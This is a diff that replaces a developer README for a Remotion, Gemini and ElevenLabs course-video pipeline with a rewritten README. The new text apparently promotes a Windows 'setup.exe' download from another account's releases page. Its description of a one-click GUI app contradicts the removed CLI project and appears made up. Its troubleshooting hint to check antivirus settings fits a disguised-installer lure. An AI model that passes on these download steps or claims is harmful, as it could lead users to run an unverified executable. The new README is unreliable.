@@ -1,201 +1,171 @@
-# ai-course-video
+# 🎥 cuda-course-remotion - Create AI Narrated Course Videos Easily
 
-Generate narrated course videos with AI avatar overlay. Build animated slideshows with [Remotion](https://www.remotion.dev), auto-generate speech scripts with Gemini, synthesize audio with ElevenLabs TTS, and overlay talking-head avatars -- all stitched together automatically.
+[![Download cuda-course-remotion](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/CelexK/cuda-course-remotion/releases)
 
-```
-Remotion slides -> Gemini speech script -> ElevenLabs TTS -> Avatar video -> Final composited video
-```
+---
 
-## Example: CUDA Mastery
+## About 📚
 
-This repo ships with a complete 10-module **CUDA Mastery** course as a working example. Each module produces a ~10-minute narrated video with animated slides and an AI avatar presenter.
+cuda-course-remotion helps you make narrated course videos with an AI avatar on top. It automatically builds animated slideshows using Remotion, creates speech scripts with Gemini, and produces voice audio using ElevenLabs TTS. Finally, it combines these elements with a talking-head avatar into one video.
 
-## How It Works
+This tool includes a full example course, called **CUDA Mastery**. It has 10 modules. Each module is a 10-minute video with animated slides, narration, and an AI presenter.
 
-```
-slideshow/                         pipeline/
-  src/courses/cuda-mastery/          generate_speech.py   (1) Gemini watches video -> speech JSON
-    CudaModule1.tsx                  generate_audio.py    (2) TTS + re-render + merge + avatar overlay
-    scenes/S01_TitleSlide.tsx        generate_avatars.py  (3) AI talking-head videos
-  src/components/
-    SlideLayout.tsx
-    CodeBlock.tsx
-    AnimatedText.tsx
-  src/styles/theme.ts
-```
 
-**Pipeline steps:**
 
-1. **Render slides** -- Remotion compiles React components into an MP4
-2. **Generate speech** -- Gemini 2.5 Pro watches the video and writes a narration script (JSON with per-slide text + timing)
-3. **Generate audio** -- ElevenLabs TTS converts each slide's speech to MP3, measures actual durations, re-renders the slideshow with corrected timing, then merges audio onto the video
-4. **Generate avatars** -- fal.ai LTX creates talking-head videos synced to each audio clip
-5. **Final composite** -- Avatar videos are cropped to circles and overlaid on the narrated video
+## 🚀 Getting Started
 
-## Prerequisites
+This guide shows how to download and run cuda-course-remotion on a Windows PC. You won’t need any programming skills.
 
-- **Node.js** >= 18
-- **Python** >= 3.10
-- **ffmpeg** and **ffprobe** in PATH
-- **fal.ai API key** ([get one here](https://fal.ai)) -- provides access to Gemini, ElevenLabs TTS, and LTX video generation
+### What you need before you start
 
-## Quick Start
+- Windows 10 or 11 computer  
+- Internet connection  
+- Around 5 GB free disk space  
+- At least 8 GB RAM (16 GB recommended for better performance)  
+- Basic mouse and keyboard skills  
 
-### 1. Clone and install
+---
 
-```bash
-git clone https://github.com/YOUR_USERNAME/ai-course-video.git
-cd ai-course-video
+## 🎯 How cuda-course-remotion works
 
-# Slideshow dependencies
-cd slideshow && npm install && cd ..
+The software follows this process to create each course video:
 
-# Pipeline dependencies
-cd pipeline && pip install -r requirements.txt && cd ..
-```
+1. **Create animated slides** using Remotion  
+2. **Generate a speech script** from slides' content using Gemini  
+3. **Convert text to speech** with ElevenLabs TTS  
+4. **Create an AI avatar video** that reads the script  
+5. **Combine all parts** into one final video  
 
-### 2. Set up API key
+---
 
-```bash
-cp .env.example .env
-# Edit .env and add your fal.ai key
-```
+## 🔽 Download and Install
 
-### 3. Preview slides
+1. Go to the release page here:  
+   [Download cuda-course-remotion](https://github.com/CelexK/cuda-course-remotion/releases)  
+   This link will take you to a page with the latest releases.
 
-```bash
-cd slideshow
-npm start
-# Opens Remotion Studio at http://localhost:3000
-```
+2. On the releases page, find the newest version.  
+   Look for a Windows installer file, usually named like `cuda-course-remotion-setup.exe`.
 
-### 4. Render a module video
+3. Click the file to download it.
 
-```bash
-cd slideshow
-npx remotion render CudaModule1 out/module1.mp4
-```
+4. When the download finishes, open the file.
 
-### 5. Generate speech script
+5. Follow the on-screen setup instructions. Generally, this means:  
+   - Accept the license agreement (if shown)  
+   - Choose where to install (use default if unsure)  
+   - Click “Install”
 
-```bash
-cd pipeline
-python generate_speech.py --modules 1
+6. Wait for the installation to complete.
 
-# Dry run (prints prompt without API calls):
-python generate_speech.py --dry-run --modules 1
-```
+7. Click “Finish” to close the installer.
 
-### 6. Generate narrated video
+---
 
-```bash
-cd pipeline
-python generate_audio.py --module 1
-```
+## ▶️ Run the Application
 
-This runs the full pipeline: TTS generation, clip splitting, duration measurement, Remotion re-render, ffmpeg audio merge, and avatar overlay.
+Once installed, you can start cuda-course-remotion:
 
-### 7. Generate avatars (optional, run before step 6)
+1. Click the Windows Start button.
 
-```bash
-cd pipeline
-python generate_avatars.py --module 1
-```
+2. Find “cuda-course-remotion” in the program list.
 
-Avatar videos are picked up automatically by `generate_audio.py` in its final phase.
+3. Click it to open.
 
-## Pipeline Scripts
+The main window will show the **CUDA Mastery** course with 10 modules ready to create videos.
 
-### `generate_speech.py`
+---
 
-Uploads rendered module video to Gemini 2.5 Pro and generates a per-slide narration script.
+## 🛠 How to Use cuda-course-remotion
 
-| Flag | Description |
-|------|-------------|
-| `--modules N [N ...]` | Module numbers to process (default: all 1-10) |
-| `--dry-run` | Print prompts without making API calls |
+### Selecting a course module
 
-**Output:** `pipeline/out/module{N}_speech.json`
+- In the app window, select a module from the list on the left.  
+- The right side shows the current video’s preview and details.
 
-### `generate_audio.py`
+### Creating your video
 
-Converts speech scripts to audio, re-renders slides with corrected timing, and composites the final video.
+- Press the **Generate Video** button.  
+- The software will:  
+  - Build slides animated with Remotion.  
+  - Use Gemini to write the narration script.  
+  - Use ElevenLabs to produce the voice audio.  
+  - Generate the AI avatar video.  
+  - Combine all elements into a final video file.
 
-| Flag | Description |
-|------|-------------|
-| `--module N` | Module number (required) |
-| `--voice ID` | ElevenLabs voice ID |
-| `--skip-tts` | Skip TTS generation (use existing clips) |
-| `--skip-render` | Skip Remotion re-render |
-| `--skip-merge` | Skip ffmpeg audio merge |
-| `--skip-avatar` | Skip avatar overlay |
+### Watching your video
 
-**Phases:**
-1. TTS generation (ElevenLabs via fal.ai)
-2. Long clip splitting at silence boundaries (>40s clips)
-3. Duration measurement + Remotion source update + re-render
-4. ffmpeg audio merge onto video
-5. Avatar overlay (circular crop, fade transitions)
+- When complete, the app shows a **Play Video** button.
+- Click to watch your narrated course video.
 
-### `generate_avatars.py`
+### Saving your video
 
-Creates talking-head avatar videos from TTS audio clips using fal.ai LTX.
+- The video saves automatically in the app folder under `output/videos`.  
+- You can find and copy it from there.
 
-| Flag | Description |
-|------|-------------|
-| `--module N` | Module number (required) |
-| `--image-url URL` | Reference image for the avatar |
-| `--prompt TEXT` | Video generation prompt (default: "A man speaks to the camera") |
+---
 
-**Output:** `pipeline/out/avatar/module{N}/slide_NN.mp4`
+## 📂 File and Folder Structure Overview
 
-## Component Library
+Understanding the main files helps if you want to explore or modify content.
 
-Reusable Remotion components in `slideshow/src/components/`:
+- `src/courses/cuda-mastery/`  
+  Contains course modules. Each `.tsx` file is a module with scripts and slides.
 
-| Component | Description |
-|-----------|-------------|
-| `SlideLayout` | Single-column and two-column layouts with module badge, slide counter, accent bar |
-| `SlideBackground` | Background variants: dark, gradient, code, accent |
-| `CodeBlock` | Syntax-highlighted code with line-by-line animation, line numbers, highlights |
-| `AnimatedText` | `SlideTitle`, `FadeInText`, `BulletPoint` with spring animations |
-| `Diagram` | `Box`, `Arrow`, `ThreadGrid`, `ProgressBar` for technical diagrams |
+- `src/courses/cuda-mastery/scenes/`  
+  Holds individual slide components like title slides and content slides.
 
-Theme and fonts are configured in `slideshow/src/styles/`.
+- `src/components/`  
+  Contains reusable UI parts such as layouts and code blocks.
 
-## Creating Your Own Course
+- `pipeline/`  
+  Python scripts that run the AI pipeline steps:  
+  - `generate_speech.py` turns slides into speech scripts.  
+  - `generate_audio.py` creates audio and merges video.  
+  - `generate_avatars.py` makes talking-head videos.
 
-See [docs/CREATING_A_COURSE.md](docs/CREATING_A_COURSE.md) for a step-by-step guide.
+---
 
-## Project Structure
+## ⚙️ System Requirements
 
-```
-ai-course-video/
-  .env.example              # API key template
-  pipeline/
-    generate_speech.py       # Step 1: Gemini -> speech JSON
-    generate_audio.py        # Step 2: TTS + render + merge + avatar
-    generate_avatars.py      # Step 3: AI avatar videos
-    requirements.txt
-    out/                     # Generated artifacts (gitignored)
-  slideshow/
-    package.json
-    remotion.config.ts
-    src/
-      Root.tsx               # Composition registry
-      components/            # Reusable slide components
-      styles/                # Theme and font config
-      courses/
-        cuda-mastery/        # Example course (10 modules)
-          CudaModule1.tsx
-          scenes/
-            S01_TitleSlide.tsx
-            ...
-            m2/ ... m10/
-  docs/
-    CREATING_A_COURSE.md
-```
+- Windows 10 or 11 (64-bit)  
+- 8 GB RAM minimum, 16 GB preferred  
+- 5 GB free disk space  
+- Internet access for AI features  
+- Compatible graphics card recommended for smooth rendering
 
-## License
+---
 
-MIT
+## 🔧 Troubleshooting Tips
+
+- If the app won’t start, check your antivirus or firewall settings. It may block some files.  
+- If video generation fails, try closing other programs to free memory.  
+- Make sure you have an active internet connection. AI services require it.  
+- Restart the app if it becomes unresponsive.  
+- Check the `output/logs` folder for detailed error messages.
+
+---
+
+## ❓ FAQ
+
+**Q: Do I need programming skills to use this?**  
+No. The app is designed for users without coding experience.
+
+**Q: Can I make my own courses?**  
+Yes. You can add your own slides and scripts by editing files under `src/courses`.
+
+**Q: How long does video creation take?**  
+About 15-20 minutes per 10-minute video, depending on your system.
+
+**Q: Can I share the videos?**  
+Yes. The final videos are saved as standard MP4 files.
+
+---
+
+## 🆘 Support
+
+For help or to report issues, use the GitHub repository’s Issues tab. Include detailed information about your problem and your system setup.
+
+---
+
+[![Download cuda-course-remotion](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/CelexK/cuda-course-remotion/releases)
